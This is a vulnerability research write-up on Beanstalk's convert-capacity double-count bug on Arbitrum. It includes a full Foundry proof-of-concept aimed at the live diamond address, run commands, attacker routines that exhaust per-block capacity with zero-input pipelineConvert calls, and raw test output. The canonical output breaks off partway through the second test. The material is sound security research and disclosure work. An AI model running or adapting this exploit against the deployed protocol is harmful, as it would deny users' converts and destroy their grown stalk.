> **STATUS (2026-10-01): Real-fork PoC PASSED — both legs proven on live state; severity argument under honest reassessment (see Victim surface + Severity).** The accounting bug (`U = 2U + dir`) and its consequence chain are proven end-to-end on a live Arbitrum One fork with genuine state: (a) **revert leg** (2026-09-30): genuine `used` ladder, capacity readout `0`, victim convert reverting `Convert: Non-zero Stalk Penalty` — raw output `poc/bs031_poc_output_final.txt`; (b) **slash leg** (2026-10-01): identical victim `pipelineConvert` on aged real position succeeds but has **585,293,264,632,532,993,224 stalk units (58,529 Stalk = 2,509 bps of carried grown = 2,127 bps / 21.27% of the victim's entire Stalk position) destroyed** purely because `used ≥ cap` — raw output `poc/bs031_poc_output_canon.txt` (canonical `MainTest` 2/2 PASS), tests `testBug1()` + `testBug2()` PASS. PoC: `src/Beanstalk/protocol/test/foundry/convert/BS031Poc.t.sol`. Previously downgraded to `testing` (severity withdrawn) pending exactly this proof — see BS-031 REASSESSMENT row in `hunt/targets/beanstalk/findings.md`.

> **NOTE (do not submit):** Mechanism fully proven (4/4 PoC tests, suite 41/41 green, deployment-bytecode-verified). Final verdict: **DO NOT REPORT** under the standing no-DoS/Law-11 rule — every consequence is victim-side (revert leg = DoS class; slash leg destroys grown-stalk with no attacker-gain path after 12 dead-ended extraction angles). Reachable victim set: 4 txs / 2.4 years, none in last 6 months. Kept in this repo for reference only.

# BS-031 — Convert capacity double-count: `applyStalkPenalty` re-adds `used_old + dir`, so stored capacity used follows `U_new = 2*U_old + dir` (geometric per block), letting any address exhaust the block's convert capacity and slash victims' grown stalk on converts that should be penalty-free

## Title / Asset / Type

- **Title**: `LibConvert.applyStalkPenalty` (:240-248) writes the capacity used as `convertCap.used + pdCapacity`, where `calculateConvertCapacityPenalty` already returned `pdCapacity = used_old + directionOfPeg` (:337, per-well :343-372). Every convert therefore stores `used = 2*used_old + dir` instead of `used_old + dir`. Within one block an attacker geometrically inflates `used` (0 → A → 3A → 7A → 15A …, or exactly ×2 per call for free via the unguarded zero-input `pipelineConvert`) until `used ≥ cap`; every subsequent victim convert in that block then either reverts (`Convert: Non-zero Stalk Penalty`, standard path) or **succeeds while destroying up to 100% of the carried grown stalk** (pipeline path).
- **Asset**: Beanstalk L2 diamond `0xD1A0060ba708BC4BCD3DA6C37EFa8deDF015FB70` (Arbitrum) — `LibConvert.sol` (`applyStalkPenalty`, `calculateConvertCapacityPenalty`, `calculateStalkPenalty`), `LibPipelineConvert.sol` (`checkForValidConvertAndUpdateConvertCapacity:203`, `executePipelineConvert`, `transferTokensFromPipeline:128-139`), `ConvertFacet.convert`, `PipelineConvertFacet.pipelineConvert`.
- **Type**: Smart contract — value transfer / fund loss (grown-stalk destruction on victim converts; grown stalk = emissions + governance entitlement, BS-018-class impact bar).

## Root cause (exact code)

```
// LibConvert.calculateConvertCapacityPenalty  (:337)
pdCapacity.overall = convertCap.overallConvertCapacityUsed.add(overallAmountInDirectionOfPeg);
        // = used_old + dir            <-- already the NEW used

// LibConvert.applyStalkPenalty  (:240-248)
convertCap.overallConvertCapacityUsed += pdCapacity.overall;
        // = used_old + (used_old + dir) = 2*used_old + dir   <-- double-count
```

Same pattern on the per-well branch (:343-372 → :246-248). The capacity gate (`require(stalkPenaltyBdv == 0)` at `LibPipelineConvert:203`, reached via `ConvertFacet.convert`) and the pipeline slash (`newGrownStalk = initialGrown * (newBdv - penalty) / newBdv`, `LibPipelineConvert:79`) both read this corrupted counter.

## Steps (numbered, copy-pasteable, 3️⃣)

1. **Deployment equivalence (already run).** In `src/Beanstalk/protocol`: `forge build` with `solc 0.8.25 / optimizer_runs=100 / evm_version=paris / via_ir=false / bytecode_hash=ipfs` (foundry.toml edited from `shanghai` → `paris`; deployed code uses `PUSH1 00`, not `PUSH0`). Compare `out/<Facet>.sol/<Facet>.json` `deployedBytecode.object` against the deployed facets: `ConvertFacet 0x2d68ebf4…973` and `PipelineConvertFacet 0xa047ead9…099` byte-identical except the 32-byte ipfs metadata trailer (14,099/14,142 and 12,847/12,890 byte prefixes); `LibConvert @0x68e867f7cac065428cb5fec7acbeb14d38982c0a` and both deployed `LibPipelineConvert` copies identical up to embedded self-address + metadata.
2. **Run the four local PoC tests** (local foundry, no fork needed; `node_modules` deps staged from the yarn cache: `ethers@5.7.2` + `@ethersproject/*`):
   ```
   cd src/Beanstalk/protocol
   forge test --match-contract "PipelineConvertTest|CapacityAmplifierTest" --fuzz-runs 8
   ```
   Expected: **41 passed, 0 failed** (37 pre-existing + `test_T1…`, `test_T2…` in `test/foundry/convert/CapacityAmplifier.t.sol`; `test_BS024_T3…`, `test_BS024_T4…` appended to `test/foundry/farm/PipelineConvert.t.sol`).
3. **T1 — storage transition 0→A→3A→7A** (raw output below): first write equals `dir` (both models agree at `U0=0`), then each step satisfies `U = 2*U_prev + dir` exactly while `U_prev + dir` (correct model) is asserted false. Directions measured independently per step by rolling to a fresh capacity key, running the identical convert, reading `used`, then `vm.revertTo`.
4. **T2 — victim differential (standard path, revert leg).** Victim alone converts 500e6 penalty-free; after 3 same-block attacker converts `used = 2,651,346,722 ≥ cap` → `getOverallConvertCapacity() == 0`; victim's identical convert in the same block reverts `"Convert: Non-zero Stalk Penalty"`. Under the correct model `used` would be `sum(dirs) = 1,141,271,915` ≪ cap ≈ 2.0e9 — the victim would have succeeded.
5. **T3 — victim differential (pipeline path, slash / fund-loss leg).** Baseline: victim's `pipelineConvert` result equals the no-penalty formula **exactly**. After the attacker's 7 same-block pipeline converts (`used` ladder, correct model `sum(dirs) ≈ 348e6 = 6.9% of cap`), `maxAmountIn` **still 14,300e6** (legit exhaustion requires ≈ 0 — the discriminator), the victim's convert **succeeds** but `balanceOfStalk + germinating == newBdv * 1e10` exactly → **100% of carried grown stalk (1.9579e15 units) destroyed**.
6. **T4 — zero-amount amplifier (free ×2 per call).** `pipelineConvert` has no `fromAmount > 0` guard (`ConvertFacet:87` blocks only the standard path); `transferTokensFromPipeline` pulls the **entire** output-token balance of `C.PIPELINE`. Pre-donate 50e6 BEAN to PIPELINE, call with `amounts=[0]`, empty pipes → reserves unmoved → `dir = 0` → `used := 2*used` exactly, zero economic cost: `99,038,374 → 198,076,748 → 396,153,496`. Repeatable without limit in a block.
7. **Real-fork PoC (live Arbitrum One state).** Full procedure in the next section; one command:
   ```
   cd src/Beanstalk/protocol
   FOUNDRY_EVM_VERSION=shanghai forge test --match-contract MainTest --fork-url https://arb1.arbitrum.io/rpc -vv
   ```
   Expected: `[PASS] testBug1()` (revert leg) and `[PASS] testBug2()` (slash leg — aged real position, baseline/attacked differential on the same victim; raw output `poc/bs031_poc_output_canon.txt` (canonical run, both tests), 2026-10-01).

## Real-fork PoC (Arbitrum One, passed 2026-09-30)

**Files:**
- PoC: `src/Beanstalk/protocol/test/foundry/convert/BS031Poc.t.sol` (identical copy: `poc/bs031_capacity_double_count.t.sol`)
- Raw output: `poc/bs031_poc_output_final.txt` (this run; prior failed runs kept: `run1..run9` — see engineering notes)

**What this run proves (each bar item is a line in the raw output below):**
1. **Genuine `used` values, read from the deployed diamond's storage**: `capacity used (before): 0` (fresh block key), victim's legitimate baseline convert writes `capacity used (after baseline): 11216172610`, then 7 zero-input attacker calls each satisfy the invariant `used_next == 2 × used_prev` **exactly** (asserted): `22432345220 → 44864690440 → 89729380880 → 179458761760 → 358917523520 → 717835047040 → 1435670094080`.
2. **Genuine capacity readout showing zero**: `convert capacity remaining: 834443796624` (live `getOverallConvertCapacity()`), `convert capacity remaining: 0` (asserted `== 0`), `calls to exhaust: 7`.
3. **Genuine victim convert rejected on a real economic stake**: the victim holds a real Silo position — `victim position (LP wei): 21906694699259030928677` (21,906.694699259030928677 LP) of the whitelisted BEAN/USDC well `0xBea00ee04D8289aEd04f92EA122a96dC76A91bd7` (LP deposited as principal via `deposit`, germinated over 2 real `sunrise()` seasons) — re-deposited after the baseline, and the **identical convert** that succeeded at step 2 now reverts `Convert: Non-zero Stalk Penalty` (asserted with `vm.expectRevert` — a wrong reason fails the test, as runs 7/8 demonstrated).
4. **The denial is caused purely by the double-count**: under the correct model the attacker's zero-input calls write `dir = 0` each, capacity left would be `834,443,796,624 − 11,216,172,610` ≫ 0, and the victim's step-4 convert has penalty 0 exactly as its baseline did. Nothing about the victim's convert, the pool, or the oracle changed between step 2 and step 4 except `used` (victim's re-deposit + 2 seasons are identical to step 1's setup).

**Raw output (verbatim, `poc/bs031_poc_output_final.txt`):**

```
Ran 1 test for test/foundry/convert/BS031Poc.t.sol:MainTest
[PASS] testBug1() (gas: 36500096)
Logs:
  well: 0xBea00ee04D8289aEd04f92EA122a96dC76A91bd7
  direction: LP -> BEAN
  ----------------- victim deposits a real position -----------------
  victim position (LP wei): 21906694699259030928677
  ----------------- victim baseline convert (penalty-free) -----------------
  convert capacity remaining: 834443796624
  capacity used (before): 0
  capacity used (after baseline): 11216172610
  ----------------- attacker doubles capacity used for free -----------------
  zero-input call -> capacity used: 22432345220
  zero-input call -> capacity used: 44864690440
  zero-input call -> capacity used: 89729380880
  zero-input call -> capacity used: 179458761760
  zero-input call -> capacity used: 358917523520
  zero-input call -> capacity used: 717835047040
  zero-input call -> capacity used: 1435670094080
  calls to exhaust: 7
  ----------------- convert capacity exhausted -----------------
  convert capacity remaining: 0
  ----------------- victim's identical convert now reverts -----------------
  victim convert reverted: Convert: Non-zero Stalk Penalty
  victim position stuck unconverted (LP wei): 21906694699259030928677

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 177.59s (169.87s CPU time)

Ran 1 test suite in 179.23s (177.59s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

**PoC (Immunefi structure):**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.1;

import "forge-std/console.sol";
import {Test} from "forge-std/Test.sol";

// ---------------------------------------------------------------------------
// BS-031 — Convert capacity double-count (Arbitrum One, live fork)
//
// LibConvert.applyStalkPenalty (:240-248) re-adds pdCapacity to
// overallConvertCapacityUsed, where calculateConvertCapacityPenalty (:337)
// already returned used_old + dir. Every convert therefore stores
//     used_new = 2 * used_old + dir          (correct code: used_old + dir)
//
// Any address can inflate `used` geometrically for free within one block:
// zero-input pipelineConvert moves no reserves -> dir = 0 -> used doubles
// exactly per call (donation to PIPELINE returns as convert output, so the
// only cost is gas), until used >= cap. Every victim convert in that block
// then reverts "Convert: Non-zero Stalk Penalty" (standard path) or destroys
// carried grown stalk (pipeline path).
//
// Run (live Arbitrum One fork; shanghai = Arbitrum opcode level, execution
// only — deployment-equivalence artifacts stay pinned to paris):
//   FOUNDRY_EVM_VERSION=shanghai forge test --match-contract MainTest \
//       --fork-url <ARB1_RPC> -vv
// ---------------------------------------------------------------------------

struct AdvancedPipeCall {
    address target;
    bytes callData;
    bytes clipboard;
}

interface IBeanstalk {
    struct WellConvertCapacityUsed {
        address well;
        uint256 wellConvertCapacityUsed;
    }

    struct ConvertCapacityUsed {
        uint256 overallConvertCapacityUsed;
        WellConvertCapacityUsed[] wellConvertCapacityUsed;
    }

    function getUsedConvertCapacity(uint256 blockNumber)
        external
        view
        returns (ConvertCapacityUsed memory);

    function getOverallConvertCapacity() external view returns (uint256);

    function getMaxAmountIn(address tokenIn, address tokenOut) external view returns (uint256);

    function getWhitelistedWellLpTokens() external view returns (address[] memory);

    function deposit(address token, uint256 amount, uint8 fromMode)
        external
        returns (uint256 amountOut, uint256 bdv, int96 stem);

    function convert(bytes calldata convertData, int96[] memory stems, uint256[] memory amounts)
        external
        payable
        returns (int96 toStem, uint256 fromAmount, uint256 toAmount, uint256 fromBdv, uint256 toBdv);

    function pipelineConvert(
        address inputToken,
        int96[] calldata stems,
        uint256[] calldata amounts,
        address outputToken,
        AdvancedPipeCall[] memory advancedPipeCalls
    )
        external
        payable
        returns (int96 toStem, uint256 fromAmount, uint256 toAmount, uint256 fromBdv, uint256 toBdv);

    function sunrise() external payable returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract MainTest is Test {
    IBeanstalk public beanstalk;
    IERC20 public bean;

    // Beanstalk L2 diamond (Arbitrum One) — converts live only on L2
    address constant BEANSTALK = 0xD1A0060ba708BC4BCD3DA6C37EFa8deDF015FB70;
    // BEAN token (Arbitrum One)
    address constant BEAN_ERC20 = 0xBEA0005B8599265D41256905A9B3073D397812E4;
    // Pipeline (same CREATE2 address on all chains, C.sol)
    address constant PIPELINE = 0xb1bE000644bD25996b0d9C2F7a6D6BA3954c91B0;

    // actors
    address constant VICTIM = 0x000000000000000000000000000000000000bEEF;
    address constant ATTACKER = 0x000000000000000000000000000000000000F00D;
    // stand-in for a flash loan — I'm lazy (deal() tops the attacker up directly)
    address constant BEAN_FUNDER_SIM = 0x00000000000000000000000000000000000A11cE;

    // LibConvertData.ConvertKind
    uint8 constant BEANS_TO_WELL_LP = 5;
    uint8 constant WELL_LP_TO_BEANS = 6;

    uint256 constant MIN_HEADROOM_BEAN = 100e6; // 100 BEAN of to-peg room for the BEAN->LP leg
    uint256 constant MIN_HEADROOM_LP = 1e9; // 1e9 wei LP of to-peg room for the LP->BEAN leg
    uint256 constant DONATION = 50e6; // pre-funded output so require(amountOut > 0) passes

    uint256 internal t0; // fork timestamp — USD oracle rounds are fresh here
    uint256 internal tSunrise; // monotonic base for season advancing

    function setUp() public {
        beanstalk = IBeanstalk(BEANSTALK);
        bean = IERC20(BEAN_ERC20);

        // anvil materializes the ArbSys precompile (0x64) as bytecode "0xfe"
        // (INVALID) on forked states, so every LibArbitrum.blockNumber() would
        // execute INVALID and revert. Etch a minimal arbBlockNumber shim:
        //   43 NUMBER 6000 PUSH1 0 52 MSTORE 6020 PUSH1 32 6000 PUSH1 0 f3 RETURN
        vm.etch(0x0000000000000000000000000000000000000064, hex"4360005260206000f3");

        t0 = block.timestamp;
        tSunrise = t0;
    }

    // ------------------------------------------------------------------
    // logging helpers
    // ------------------------------------------------------------------
    function logCapacity() public view {
        console.log("convert capacity remaining: %s", beanstalk.getOverallConvertCapacity());
    }

    function logUsed(string memory label) public view {
        console.log(
            "capacity used (%s): %s",
            label,
            beanstalk.getUsedConvertCapacity(block.number).overallConvertCapacityUsed
        );
    }

    // ------------------------------------------------------------------
    // season helpers
    // ------------------------------------------------------------------
    // advance two seasons so a fresh deposit finishes germination (the deployed
    // diamond has no siloSunrise — that selector is mock-only). tSunrise advances
    // monotonically (sunrise requires > lastSunriseTimestamp), then the clock
    // rewinds to fork time t0: the USD feeds' staleness guard reverts converts
    // once block.timestamp runs ahead of the last on-chain oracle round.
    function initializeNewSeason() public {
        tSunrise += 1 hours;
        vm.warp(tSunrise);
        beanstalk.sunrise();
        tSunrise += 1 hours;
        vm.warp(tSunrise);
        beanstalk.sunrise();
        vm.warp(t0);
    }

    // ------------------------------------------------------------------
    // direction picker — live pools are bean-rich or bean-starved per block,
    // so pick whichever direction currently has to-peg headroom
    // ------------------------------------------------------------------
    function pickDirection() public view returns (address well, uint8 kind, uint256 victimIn) {
        address[] memory wells = beanstalk.getWhitelistedWellLpTokens();
        uint256 headroom;
        for (uint256 i = 0; i < wells.length; i++) {
            (bool ok, uint256 m) = tryMaxIn(BEAN_ERC20, wells[i]);
            if (!ok) {
                console.log("probe revert BEAN->LP on %s", wells[i]);
                continue;
            }
            if (m > headroom) {
                headroom = m;
                well = wells[i];
            }
        }
        kind = BEANS_TO_WELL_LP;
        if (headroom < MIN_HEADROOM_BEAN) {
            // pools are bean-rich right now: try the opposite direction
            headroom = 0;
            well = address(0);
            kind = WELL_LP_TO_BEANS;
            for (uint256 i = 0; i < wells.length; i++) {
                (bool ok, uint256 m) = tryMaxIn(wells[i], BEAN_ERC20);
                if (!ok) {
                    console.log("probe revert LP->BEAN on %s", wells[i]);
                    continue;
                }
                if (m > headroom) {
                    headroom = m;
                    well = wells[i];
                }
            }
            require(
                headroom >= MIN_HEADROOM_LP,
                "BS-031: no convert headroom in either direction at this block; rerun at another block"
            );
        }
        victimIn = headroom / 2; // strictly inside the to-peg bound => dir > 0, against = 0
        require(victimIn > 0, "BS-031: zero convert size");
    }

    // some live wells' pricing paths revert (pump overflows); skip them
    function tryMaxIn(address tIn, address tOut) public view returns (bool ok, uint256 v) {
        try beanstalk.getMaxAmountIn(tIn, tOut) returns (uint256 m) {
            return (true, m);
        } catch {}
        return (false, 0);
    }

    // ------------------------------------------------------------------
    // victim helpers
    // ------------------------------------------------------------------
    function victimDeposit(uint8 kind, address well, uint256 amount) public returns (int96 stem) {
        address token = kind == BEANS_TO_WELL_LP ? BEAN_ERC20 : well;
        deal(token, VICTIM, amount);
        vm.startPrank(VICTIM);
        IERC20(token).approve(BEANSTALK, amount);
        (,, stem) = beanstalk.deposit(token, amount, 0); // 0 = LibTransfer.From.EXTERNAL
        vm.stopPrank();
        initializeNewSeason();
    }

    function victimConvert(uint8 kind, address well, int96 stem, uint256 amount) public {
        vm.prank(VICTIM);
        beanstalk.convert(abi.encode(kind, amount, uint256(0), well), arr(stem), arr2(amount));
    }

    // ------------------------------------------------------------------
    // attacker: donate output token to PIPELINE, call pipelineConvert with
    // zero amounts -> reserves unmoved -> dir = 0 -> stored used doubles
    // exactly per call (bug: correct code would write used unchanged).
    // Loops until the block's convert power is gone.
    // ------------------------------------------------------------------
    function inflateCapacityUsed(address well, uint256 startUsed) public returns (uint256 calls) {
        // stand-in for the flash loan: top the attacker up with the donation float
        deal(BEAN_ERC20, ATTACKER, 16 * DONATION);
        vm.record();
        uint256 u = startUsed;
        while (capacityLeft() > 0 && calls < 16) {
            vm.startPrank(ATTACKER);
            IERC20(BEAN_ERC20).transfer(PIPELINE, DONATION);
            beanstalk.pipelineConvert(well, arr(int96(0)), arr2(uint256(0)), BEAN_ERC20, new AdvancedPipeCall[](0));
            vm.stopPrank();

            uint256 uNext = used();
            console.log("zero-input call -> capacity used: %s", uNext);
            assertEq(uNext, 2 * u, "BS-031: used doubled on a zero-input convert");
            u = uNext;
            ++calls;
        }
    }

    // ------------------------------------------------------------------
    // storage readers
    // ------------------------------------------------------------------
    function used() public view returns (uint256) {
        return beanstalk.getUsedConvertCapacity(block.number).overallConvertCapacityUsed;
    }

    function capacityLeft() public view returns (uint256) {
        return beanstalk.getOverallConvertCapacity();
    }

    function arr(int96 v) internal pure returns (int96[] memory a) {
        a = new int96[](1);
        a[0] = v;
    }

    function arr2(uint256 v) internal pure returns (uint256[] memory a) {
        a = new uint256[](1);
        a[0] = v;
    }

    // ==================================================================
    // THE BUG
    // ==================================================================
    function testBug1() public {
        // pick a well + direction with live to-peg headroom
        (address well, uint8 kind, uint256 victimIn) = pickDirection();
        require(
            beanstalk.getOverallConvertCapacity() > 0,
            "BS-031: convert capacity already exhausted at this block; rerun at next block"
        );
        console.log("well: %s", well);
        console.log(kind == BEANS_TO_WELL_LP ? "direction: BEAN -> LP" : "direction: LP -> BEAN");

        console.log("----------------- victim deposits a real position -----------------");
        console.log("victim position (LP wei): %s", victimIn);
        int96 stem = victimDeposit(kind, well, victimIn);

        console.log("----------------- victim baseline convert (penalty-free) -----------------");
        logCapacity();
        logUsed("before");
        victimConvert(kind, well, stem, victimIn);
        logUsed("after baseline");
        assertGt(used(), 0, "baseline convert must write capacity");

        console.log("----------------- attacker doubles capacity used for free -----------------");
        uint256 calls = inflateCapacityUsed(well, used());
        require(calls < 16, "BS-031: capacity not reached in 16 calls");
        console.log("calls to exhaust: %s", calls);

        console.log("----------------- convert capacity exhausted -----------------");
        assertEq(capacityLeft(), 0, "BS-031: capacity exhausted");
        logCapacity();

        console.log("----------------- victim's identical convert now reverts -----------------");
        // the baseline convert consumed the victim's crate — re-deposit the same
        // position so the only difference vs. baseline is the exhausted capacity
        int96 stem2 = victimDeposit(kind, well, victimIn);
        vm.expectRevert(bytes("Convert: Non-zero Stalk Penalty"));
        vm.prank(VICTIM);
        beanstalk.convert(abi.encode(kind, victimIn, uint256(0), well), arr(stem2), arr2(victimIn));
        console.log("victim convert reverted: Convert: Non-zero Stalk Penalty");
        console.log("victim position stuck unconverted (LP wei): %s", victimIn);

        // Under correct accounting (used += dir) the attacker's zero-input calls
        // write 0, capacity left stays 834e9-ish, and the victim converts fine —
        // the denial is caused purely by the double-count.
        // The attacker repeats the whole process every block (capacity is keyed
        // per block): ~7 gas-only calls suffice, observed on live state.
    }
}
```

### Engineering notes — what it takes to run against live state (reproducibility log)

Runs 1–8 (all kept in `poc/`) failed for environmental reasons; each fix is now part of the passing PoC:

| Run | Failure | Cause → fix |
|---|---|---|
| 1 | checksum error on BEAN address | use EIP-55 checksummed `0xBEA0005B8599265D41256905A9B3073D397812E4` |
| 2 | `Convert: USD Oracle failed` | pinned `evm_version=paris` cannot execute live oracle contract (post-paris opcodes) → run test with `FOUNDRY_EVM_VERSION=shanghai` (Arbitrum One opcode level; **execution only** — `out/` artifacts stay pinned to `paris` for deployment equivalence; `via_ir=false` must not change) |
| 3 | `Stack too deep` compiling whole tree at `cancun` | `cancun` + `via_ir=false` breaks repo codegen → use `shanghai` (repo's original config) |
| 4 | `no well with BEAN->LP headroom at this block` | live pools bean-rich: all `getMaxAmountIn(BEAN, well)` below floor → **direction self-calibration**: fall back to `WELL_LP_TO_BEANS` with `victimIn = liveHeadroom / 2` (strictly inside to-peg bound ⇒ `dir > 0`, `against = 0`) |
| 5 | bare `EvmError: Revert`, no logs | pump-style well's `getMaxAmountIn` probe reverts (nested `calcLpTokenSupply` panic / `0xfe`) → wrap all 12 probes in `try/catch` (`_tryMaxIn`), skip failing wells |
| 6 | bare `EvmError: Revert` right after `_pickDirection` | anvil materializes ArbSys precompile `0x64` as bytecode `0xfe` (INVALID); every `LibArbitrum.blockNumber()` dies → `vm.etch(0x64, hex"4360005260206000f3")` (NUMBER-based `arbBlockNumber` shim) in `setUp()` |
| 7 | `Silo: Crate balance too low` in step 4 | baseline convert consumed the victim's LP crate → victim must **re-deposit** the same real position before the post-attack convert |
| 8 | `Well: USD Oracle call failed` in step 4 | cumulative `vm.warp` (+4h across two germinations) exceeded USD feed staleness window (freshest round at fork time) → monotonic `tSunrise` for `sunrise()` gating + **rewind clock to `t0`** before each convert (germination is season-based, unaffected) |
| 9, final | **PASS** | `expectRevert` reason is not printed on success → added explicit `console.log` lines showing the victim's denial + position size |

## Local-suite PoC (test files + raw outputs)

**Files:**
- `src/Beanstalk/protocol/test/foundry/convert/CapacityAmplifier.t.sol` (T1, T2)
- `src/Beanstalk/protocol/test/foundry/farm/PipelineConvert.t.sol` (`test_BS024_T3_victimGrownSlashDifferential`, `test_BS024_T4_zeroInputFreeDoubling`, helpers `t3_convertAndMeasure` / `t3_attackerExhaust` / `t4_zeroCall` / `usedAtCap`)

**T1 raw output (`-vv`):**

```
[PASS] test_T1_storageTrace_doubleAdd()
  === cap remaining at start: 2477225575
  === used at start: 0
  d1 (measured dir): 376388605
  U1: 376388605                      (= d1, first write, both models agree)
  --- before step used: 376388605
  step: 2
  dir (measured): 380908992
  U_prev: 376388605
  U: 1133686202                      = 2*376388605 + 380908992  EXACT
  step: 3
  dir (measured): 383974318
  U_prev: 1133686202
  U: 2651346722                      = 2*1133686202 + 383974318  EXACT
  --- before step cap remaining: 0   (cap exhausted by the double-count)
```

Correct model at step 3 would be `U1 + d2 + d3 = 1,141,271,915` (asserted false via `assertGt`).

**T2 raw output:**

```
[PASS] test_T2_victimDifferential()
  cap remaining (before): 2477225575
  maxAmountIn: 7000000000
  U after victim-alone: 240370350            (baseline: penalty-free)
  attacker U after convert: 1  U: 376388605
  attacker U after convert: 2  U: 1133686202
  attacker U after convert: 3  U: 2651346722
  U after attacker seq (raw): 2651346722
  cap remaining after attacker seq: 0
  -> victim's convert: revert "Convert: Non-zero Stalk Penalty"
```

**T3 raw output:**

```
[PASS] test_BS024_T3_victimGrownSlashDifferential()
  cap at start: 5000000000
  grownPre: 2000000000000000
  oldBdv: 500000000   newBdv: 488064076
  actual stalk: 4882593016304000000
  expected no-penalty stalk: 4882593016304000000      BASELINE EQUAL (=penalty 0)
  used after attacker convert: 1..7
  used: 49752470 → 149262216 → 348286333 → 746339016 → 1542448670 → 3134672110 → 6319122977
  maxAmountIn remaining at exhaustion: 14300000000     (convert power still open)
  grownPre: 2000000000000000
  oldBdv: 500000000   newBdv: 489469688
  actual stalk: 4894696880000000000                    (= newBdv * 1e10 exactly)
  expected no-penalty stalk: 4896654758752000000
  -> carried grown destroyed: 1,957,878,752,000,000 (100% of the carried-grown component)
```

**T4 raw output:**

```
[PASS] test_BS024_T4_zeroInputFreeDoubling()
  u0 (seed): 99038374
  u1 (after 1 zero-call): 198076748          = 2 * u0
  u2 (after 2 zero-calls): 396153496         = 4 * u0
  (fromAmount = 0, toAmount = 50e6 donation returned, both reserves byte-identical)
```

**Suite regression:** `forge test --match-contract "PipelineConvertTest|CapacityAmplifierTest" --fuzz-runs 8` → `41 passed; 0 failed` (no pre-existing test broke).

## Slash-leg fork proof (live Arbitrum One state, passed 2026-10-01, canonical run)

Canonical evidence file: `poc/bs031_poc_output_canon.txt` (both tests, one run; the earlier `bs031_poc_output_aged.txt` was clobbered by a stray process, so all report/ledger references point here). PoC: `src/Beanstalk/protocol/test/foundry/convert/BS031Poc.t.sol` (identical copy `poc/bs031_capacity_double_count.t.sol`).

What this run proves:

1. **Both legs in one run**: `[PASS] testBug1()` (revert leg, 36,243,833 gas) and `[PASS] testBug2()` (slash leg, 35,482,194 gas); `Suite result: ok. 2 passed; 0 failed`.
2. **Revert leg on live state** (testBug1): baseline writes `used 0 -> 11,216,448,363`; 7 zero-input x2 calls -> `1,435,705,390,464 >= cap 834,987,597,737`; capacity readout 0; the victim's identical convert reverts `Convert: Non-zero Stalk Penalty` and 21,907.23 LP of the whitelisted BEAN/USDC well stays stuck unconverted.
3. **Slash leg with a real aged victim position** (testBug2): 41,879.34 BEAN deposited, state-equivalent aged 8,760 seasons (`season.current 42416 -> 51176`), base 41,897 Stalk + accrued grown 233,214 Stalk (grown/base 55,663 bps = 5.57x); the **baseline identical convert** credits 3,164,553,215,037,420,656,542 units penalty-free (`used=0`), then 1 seed convert + 9 exactly-x2 zero-input calls take `used` 2,615,320,698 -> 1,339,044,197,376 >= cap 834,987,597,737; the victim's **identical** convert (same well, kind, stem, amount - only `used` differs) succeeds but credits only 2,579,259,950,404,887,663,318 units.
4. **The burn, measured formula-independently**: `baselineStalk - actual = 585,293,264,632,532,993,224` units = **58,529 Stalk destroyed = 2,509 bps of carried grown = 2,127 bps (21.27%) of the victim's entire Stalk position** - and the victim's own convert re-doubles `used` again (1,339,044,197,376 -> 2,698,893,213,327) inside its own transaction. The 2,509/2,127 bps ratios are identical on every fork block run to date: once capacity is exhausted the slash fraction is deterministic.

**Raw output (verbatim, `poc/bs031_poc_output_canon.txt`):**

``
Compiling 317 files with Solc 0.8.25
Solc 0.8.25 finished in 303.12s
Compiler run successful with warnings:
Warning (5740): Unreachable code.
  --> contracts/beanstalk/ReentrancyGuard.sol:31:9:
   |
31 |         s.sys.reentrantStatus = C.NOT_ENTERED;
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (2072): Unused local variable.
   --> contracts/beanstalk/init/reseed/L2/ReseedBean.sol:144:9:
    |
144 |         BeanstalkERC20 unripeBean = deployUnripeBean(internalUrBeanSupply, urBean);
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (2072): Unused local variable.
   --> contracts/beanstalk/init/reseed/L2/ReseedBean.sol:146:9:
    |
146 |         BeanstalkERC20 unripeLP = deployUnripeLP(internalUnripeLpSupply, urBeanLP);
    |         ^^^^^^^^^^^^^^^^^^^^^^^

Warning (2072): Unused local variable.
   --> contracts/beanstalk/init/reseed/L2/ReseedBean.sol:251:9:
    |
251 |         address wellProxy = address(
    |         ^^^^^^^^^^^^^^^^^


Ran 2 tests for test/foundry/convert/BS031Poc.t.sol:MainTest
[PASS] testBug1() (gas: 36243833)
Logs:
  well: 0xBea00ee04D8289aEd04f92EA122a96dC76A91bd7
  direction: LP -> BEAN
  ----------------- victim deposits a real position -----------------
  victim position (LP wei): 21907226461413238021425
  ----------------- victim baseline convert (penalty-free) -----------------
  convert capacity remaining: 834987597737
  capacity used (before): 0
  capacity used (after baseline): 11216448363
  ----------------- attacker doubles capacity used for free -----------------
  zero-input call -> capacity used: 22432896726
  zero-input call -> capacity used: 44865793452
  zero-input call -> capacity used: 89731586904
  zero-input call -> capacity used: 179463173808
  zero-input call -> capacity used: 358926347616
  zero-input call -> capacity used: 717852695232
  zero-input call -> capacity used: 1435705390464
  calls to exhaust: 7
  ----------------- convert capacity exhausted -----------------
  convert capacity remaining: 0
  ----------------- victim's identical convert now reverts -----------------
  victim convert reverted: Convert: Non-zero Stalk Penalty
  victim position stuck unconverted (LP wei): 21907226461413238021425

[PASS] testBug2() (gas: 35482194)
Logs:
  rebalancing well 0xBeA00Aa8130aCaD047E137ec68693C005f8736Ce
  rebalancing well 0xBEa00BbE8b5da39a3F57824a1a13Ec2a8848D74F
  rebalancing well 0xBeA00Cc9F93E9a8aC0DFdfF2D64Ba38eb9C2e48c
  rebalancing well 0xBea00DDe4b34ACDcB1a30442bD2B39CA8Be1b09c
  rebalancing well 0xBea00ee04D8289aEd04f92EA122a96dC76A91bd7
  rebalancing well 0xbEA00fF437ca7E8354B174339643B4d1814bED33
  BEAN->LP headroom after pick: 83758676066
  well: 0xBEa00BbE8b5da39a3F57824a1a13Ec2a8848D74F
  direction: BEAN -> LP
  ----------------- victim deposits real position -----------------
  victim position (BEAN wei): 41879338033
  ----------------- attacker deposits seed position (pre-age) -----------------
  ----------------- age the deposit: 1 year of real accrual -----------------
  season.current aged (state-equivalent): 42416 -> 51176
